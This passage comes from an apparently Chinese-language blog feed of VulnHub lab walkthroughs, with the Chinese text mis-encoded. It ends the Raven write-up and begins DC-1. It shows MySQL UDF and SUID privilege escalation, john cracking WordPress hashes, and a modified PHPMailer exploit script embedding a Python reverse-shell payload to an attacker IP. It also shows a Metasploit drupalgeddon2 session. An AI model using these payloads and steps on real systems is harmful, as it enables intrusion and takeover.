class="hljs-string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br>Query OK, 1 row affected (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> create <span class="hljs-keyword">function</span> do_system returns <span class="hljs-built_in">integer</span> soname <span class="hljs-string">&#x27;1518.so&#x27;</span>;</span><br>Query OK, 0 rows affected (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from mysql.func;</span><br>+-----------+-----+---------+----------+<br>| name      | ret | dl      | type     |<br>+-----------+-----+---------+----------+<br>| do_system |   2 | 1518.so | function |<br>+-----------+-----+---------+----------+<br>1 row in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select do_system(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br>+--------------------------------------+<br>| do_system(&#x27;chmod u+s /usr/bin/find&#x27;) |<br>+--------------------------------------+<br>|                                    0 |<br>+--------------------------------------+<br>1 row in set (0.02 sec)<br></code></pre></td></tr></table></figure><p>ä¸Šé¢åˆ©ç”¨ UDF æˆåŠŸå°† find èµ‹äºˆäº† SUID æƒé™ï¼Œæ¥ä¸‹æ¥è¿›è¡Œ SUID ææƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ ls -al /usr/bin/find<br>-rwsr-xr-x 1 root root 233984 Nov  9  2014 /usr/bin/find<br>michael@Raven:~$ find / -name flag4.txt -exec &quot;/bin/sh&quot; \;<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=1000(michael) gid=1000(michael) euid=0(root) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> cat /root/flag4.txt</span><br>flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;<br>CONGRATULATIONS on successfully rooting Raven!<br>This is my first Boot2Root VM - I hope you enjoyed it.<br>Hit me up on Twitter and let me know what you thought: <br>@mccannwj / wjmccann.github.io<br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>1ã€WordPress </p><p>2ã€WordPress æšä¸¾ã€çˆ†ç ´ï¼›SSH çˆ†ç ´</p><p>3ã€WordPress é…ç½®æ–‡ä»¶ï¼›mysql rootæƒé™ã€ç”¨æˆ·å¯†ç ã€flag</p><p>4ã€john çˆ†ç ´</p><p>5ã€sudo ææƒï¼ˆpythonï¼‰ï¼ŒMySQL UDF ææƒ - SUID ææƒï¼ˆfindï¼‰</p><h2 id="äº”ã€å…¶ä»–"><a href="#äº”ã€å…¶ä»–" class="headerlink" title="äº”ã€å…¶ä»–"></a>äº”ã€å…¶ä»–</h2><p><strong>john è§£å¯†ä¹‹åæ— æ³•å†æ¬¡è§£å¯†ï¼š</strong></p><p>è§£å†³ï¼šå½“æˆ‘ä»¬ç ´è§£æˆåŠŸåï¼Œjohn ä¼šå°†ç ´è§£æˆåŠŸçš„ hash ç¼“å­˜åœ¨å®¶ç›®å½•çš„ <code>.john/john.pot</code> æ–‡ä»¶ä¸­ï¼Œéœ€è¦æ‰‹åŠ¨åˆ é™¤ <code>rm -rf ~/.john/john.pot</code> ï¼Œæˆ–è€…åˆ é™¤  <code>.john/john.pot</code>   æ–‡ä»¶ä¸‹è§£å¯†è¿‡çš„å­—ç¬¦ä¸²ï¼Œæ‰å¯ä»¥å†æ¬¡è¿›è¡Œè§£å¯†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>No password hashes left to crack (see FAQ)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span>                                     <br>?:pink84<br><br>1 password hash cracked, 0 left<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat .john/john.pot</span><br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$xe</span>/eyoTx<span class="hljs-variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:computer</span><br><span class="hljs-meta">$</span><span class="bash">P<span class="hljs-variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/:pink84</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> vim .john/john.pot</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat .john/john.pot</span><br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$xe</span>/eyoTx<span class="hljs-variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:computer</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span>                                     <br>0 password hashes cracked, 1 left<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>Cost 1 (iteration count) is 8192 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>pink84           (?)<br>1g 0:00:00:07 DONE (2022-06-27 10:05) 0.1295g/s 5944p/s 5944c/s 5944C/s tamika1..milkdud<br>Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably<br>Session completed<br>                                                                                                             $ cat .john/john.pot                                                           <br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$xe</span>/eyoTx<span class="hljs-variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:computer</span><br><span class="hljs-meta">$</span><span class="bash">P<span class="hljs-variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/:pink84</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>No password hashes left to crack (see FAQ)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span>                                            <br>?:pink84<br><br>1 password hash cracked, 0 left<br></code></pre></td></tr></table></figure><p><strong>MySQL UDFï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">mysql&gt;</span><span class="bash"> select do_system(<span class="hljs-string">&#x27;whoami&gt;/tmp/out&#x27;</span>);</span><br>+------------------------------+<br>| do_system(&#x27;whoami&gt;/tmp/out&#x27;) |<br>+------------------------------+<br>|                            0 |<br>+------------------------------+<br>1 row in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> system cat /tmp/out</span><br>root<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> \! sh</span><br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>michael<br><span class="hljs-meta">$</span><span class="bash"> cat /tmp/out</span><br>root<br></code></pre></td></tr></table></figure><p><strong>æ–‡ä»¶ä¸Šä¼  GetShellï¼š</strong></p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_43168364/article/details/108206821">https://blog.csdn.net/qq_43168364/article/details/108206821</a></p></blockquote><p>åœ¨ <code>http://192.168.15.172/vendor/</code> ç›®å½•ä¸‹å‘ç°äº† <code>PHPMailerAutoload.php</code> æ–‡ä»¶ã€‚</p><p>phpMailer æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„ php å‘é€é‚®ä»¶ç±»ï¼ŒPHPMailer &lt; 5.2.18 ä¸­å­˜åœ¨é«˜å±å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…åªéœ€å·§å¦™åœ°æ„é€ å‡ºä¸€ä¸ªæ¶æ„é‚®ç®±åœ°å€ï¼Œå³å¯å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„å±å®³ã€‚</p><p>å¯ä»¥åœ¨ <code>http://192.168.15.172/vendor/VERSION</code> ä¸­æŸ¥çœ‹ phpMailer çš„ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ä¸ºï¼š<code>5.2.16</code> ã€‚</p><p>ç”¨ searchsploit æŸ¥æ‰¾ phpmailer çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¿™é‡Œä½¿ç”¨ 40974.py è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit phpmailer</span>  <br>---------------------------------------------------------------------------- -------------------------------<br> Exploit Title                                                              |  Path<br>---------------------------------------------------------------------------- -------------------------------<br>PHPMailer 1.7 - &#x27;Data()&#x27; Remote Denial of Service                           | php/dos/25752.txt<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40968.sh<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40970.php<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40974.py<br>PHPMailer &lt; 5.2.19 - Sendmail Argument Injection (Metasploit)               | multiple/webapps/41688.rb<br>PHPMailer &lt; 5.2.20 - Remote Code Execution                                  | php/webapps/40969.pl<br>PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution                    | php/webapps/42221.py<br>PHPMailer &lt; 5.2.21 - Local File Disclosure                                  | php/webapps/43056.py<br>WordPress Plugin PHPMailer 4.6 - Host Header Command Injection (Metasploit) | php/remote/42024.rb<br>---------------------------------------------------------------------------- -------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ python è„šæœ¬çš„å†…å®¹ï¼š</p><blockquote><p>PS:åé—¨æ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºçš„è·¯å¾„åº”è¯¥æ˜¯å¿…é¡»è¦æ›´æ”¹çš„å¦åˆ™æ— æ³•åå¼¹shellï¼Œä¸”æ–‡ä»¶åä¸èƒ½ç”¨ backdoor.php </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-string">&#x27;http://localhost:8080&#x27;</span><br>backdoor = <span class="hljs-string">&#x27;/backdoor.php&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.0.12\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><br>fields=&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;submit&#x27;</span>,<br>        <span class="hljs-string">&#x27;name&#x27;</span>: payload,<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/www/backdoor.php server\&quot; @protonmail.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Pwned&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-string">&#x27;http://192.168.135.149/contact.php&#x27;</span><br>backdoor = <span class="hljs-string">&#x27;/backdoor.php&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.135.141\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><br>fields=&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;submit&#x27;</span>,<br>        <span class="hljs-string">&#x27;name&#x27;</span>: payload,<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/var/www/html/wzz.php server\&quot; @protonmail.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Pwned&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ kali ä¸­è¿è¡Œ 40974.py æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 40974.py</span> <br></code></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šåœ¨é¶æœºçš„ç½‘ç«™æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª wzz.php æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ ls /var/www/html<br>about.html   contact.zip  elements.html  img         js    Security - Doc  team.html  wordpress<br>contact.php  css          fonts          index.html  scss  service.html    vendor     wzz.php<br>michael@Raven:~$ find / -name &quot;wzz.php&quot; 2&gt;/dev/null<br>/var/www/html/wzz.php<br></code></pre></td></tr></table></figure><p>kali ä¸­ç›‘å¬ 4444 ç«¯å£ï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—® <code>http://192.168.135.149/wzz.php</code> æ–‡ä»¶ã€‚ç„¶åå°± getshell æˆåŠŸäº†ã€‚</p><blockquote><p>è¿™ç§æ–¹æ³•ä½¿ç”¨çš„å‰ææ˜¯æˆ‘ä»¬è¦çŸ¥é“ç½‘ç«™çš„æ ¹è·¯å¾„ï¼Œé¶æœºçš„è¯ä¸€èˆ¬å°±æ˜¯/var/www/html</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>     <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.149] 57054<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å¼€æ”¾çš„ç«¯å£å·ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> netstat -antpl</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DCï¼š1</title>
    <link href="/2022/06/26/Penetration/Vulnhub/Part-1/0x04%20DC-1/"/>
    <url>/2022/06/26/Penetration/Vulnhub/Part-1/0x04%20DC-1/</url>
    
    <content type="html"><![CDATA[<h1 id="0x04-DC-1-vulnhub"><a href="#0x04-DC-1-vulnhub" class="headerlink" title="0x04 DC: 1~vulnhub"></a>0x04 DC: 1~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/dc-1,292/">DC: 1 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.147</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 03:34 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.00032s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.00036s latency).<br>Nmap scan report for 192.168.135.147<br>Host is up (0.0011s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.54 seconds<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.147</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>ç®€å•çš„ç«¯å£æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.147</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 03:35 EDT<br>Nmap scan report for 192.168.135.147<br>Host is up (0.00090s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>56253/tcp open  unknown<br>MAC Address: 00:0C:29:87:9B:9D (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 3.80 seconds<br></code></pre></td></tr></table></figure><p><strong>å…¨é¢æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.147</span><br><br>80/tcp    open  http    Apache httpd 2.2.22 ((Debian))<br>|_http-generator: Drupal 7 (http://drupal.org)<br>| http-robots.txt: 36 disallowed entries (15 shown)<br>| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br>|_/LICENSE.txt /MAINTAINERS.txt<br>|_http-server-header: Apache/2.2.22 (Debian)<br>|_http-title: Welcome to Drupal Site | Drupal Site<br><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>å…¶ä»–</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td></td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Drupal 7</td></tr><tr><td>111/tcp</td><td>open</td><td>rpcbind</td><td></td></tr><tr><td>56253/tcp</td><td>open</td><td>unknown</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>80ç«¯å£</strong></p><p>æŸ¥çœ‹ï¼Œå‘ç°æ˜¯ä¸ª  Drupal çš„ç™»å½•é¡µé¢ã€‚å¯ä»¥åœ¨ MSF ä¸Šæ ¹æ® Drupal æ¼æ´è„šæœ¬è¿›è¡Œæƒé™è·å–ã€‚</p><p><strong>111ç«¯å£</strong></p><p>æŸ¥çœ‹æ— æœã€‚</p><p><strong>56253ç«¯å£</strong></p><p>æŸ¥çœ‹æ— æœã€‚</p><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>æ‰“å¼€msfï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfconsole</span><br>msf6 &gt;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>exploit/unix/webapp/drupal_drupalgeddon2</code> æ¨¡å—ï¼Œæ‹¿åˆ°ç½‘ç«™æƒé™ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2<br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options<br><br>Module options (exploit/unix/webapp/drupal_drupalgeddon2):<br><br>   Name         Current Setting  Required  Description<br>   ----         ---------------  --------  -----------<br>   DUMP_OUTPUT  false            no        Dump payload command output<br>   PHP_FUNC     passthru         yes       PHP function to execute<br>   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]<br>   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT        80               yes       The target port (TCP)<br>   SSL          false            no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI    /                yes       Path to Drupal install<br>   VHOST                         no        HTTP server virtual host<br><br><br>Payload options (php/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic (PHP In-Memory)<br><br><br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOST 192.168.135.147<br>RHOST =&gt; 192.168.135.147<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)<br>[!] The service is running, but could not be validated.<br>[*] Sending stage (39282 bytes) to 192.168.135.147<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.147:41230) at 2022-06-26 04:42:52 -0400<br><br>meterpreter &gt; shell<br>Process 3432 created.<br>Channel 0 created.<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@DC-1:/var/www$ whoami<br>whoami<br>www-data<br>www-data@DC-1:/var/www$ id<br>id<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><blockquote><p><a href="https://www.jianshu.com/p/86b3c598a4c4">Vulnhubé¶æœºæ¸—é€æµ‹è¯•â€”â€”DC-1 - ç®€ä¹¦ (jianshu.com)</a></p></blockquote><h3 id="1ã€flags"><a href="#1ã€flags" class="headerlink" title="1ã€flags"></a>1ã€flags</h3><p>æŸ¥çœ‹å½“å‰ç›®å½•ï¼Œå‘ç° flag1.txt ï¼ŒæŸ¥çœ‹æ–‡ä»¶å¾—åˆ°æç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www$ ls<br>ls<br>COPYRIGHT.txt       LICENSE.txt      cron.php     misc        